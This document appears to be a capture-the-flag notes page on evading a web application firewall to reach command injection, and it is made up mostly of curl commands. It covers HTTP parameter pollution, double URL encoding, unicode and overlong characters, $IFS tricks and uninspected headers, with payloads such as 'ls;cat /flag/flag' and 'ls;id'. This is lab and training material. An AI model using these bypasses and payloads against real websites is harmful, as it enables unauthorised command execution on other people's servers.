# WAF evasion — encodings & HTTP Parameter Pollution

**Signs**: a naive payload (`ls; cat /flag/flag`) gets `403 WAF: request blocked`, but a clean
command works. Hint "two readers, one request" — the WAF and the app parse the request differently.

## 1. Confirm the WAF
```bash
curl -s -o /dev/null -w '%{http_code}\n' "$T/run?cmd=ls"            # 200
curl -s -o /dev/null -w '%{http_code}\n' "$T/run?cmd=ls%3b+id"      # 403 ⇒ WAF on metachars
```

## 2. HTTP Parameter Pollution (WAF checks one copy, app uses another)
```bash
curl -s "$T/run?cmd=ls&cmd=ls%3b+cat+/flag/flag"       # WAF: first, app: last
curl -s "$T/run?cmd=ls%3b+cat+/flag/flag&cmd=ls"       # the opposite
curl -s "$T/run?cmd=ls" --data 'cmd=ls;id'             # query vs body
```
Framework behaviour: Flask `request.args.get` → first, `getlist()[-1]` → last; PHP → last;
ASP.NET → joins with `,`; Express → array.

## 3. Double encoding (app decodes again after the WAF)
```bash
curl -s "$T/run?cmd=ls%253b+cat+/flag/flag"     # wire %253b → WAF sees %3b → app decodes to ;
```
`%25` = `%`. Triple: `%25253b`. Note: the separator still needs a command before it (`ls;`), a bare
`; cat` is a syntax error.

## 4. Other encodings / tricks
- Mixed case (`SeLeCt`), unicode (`%u003b`, fullwidth `；`), overlong UTF-8 (`%c0%bb`)
- Chunked transfer-encoding splitting the body; `Content-Type` switch (JSON vs form)
- Insert `$IFS`, quotes, `\` inside words; newline instead of `;`
- Put the payload in a header/cookie/JSON field the WAF doesn't inspect

Script: `python scripts/injection/waf_variants.py "$T/run" cmd 'ls;cat /flag/flag'` sends HPP and
encoding variants and prints status + flag hits.

Seen in: `inj14` (GateKeeper: HPP `?cmd=ls&cmd=ls%3b+cat+/flag/flag` or double-encoded `%253b`).
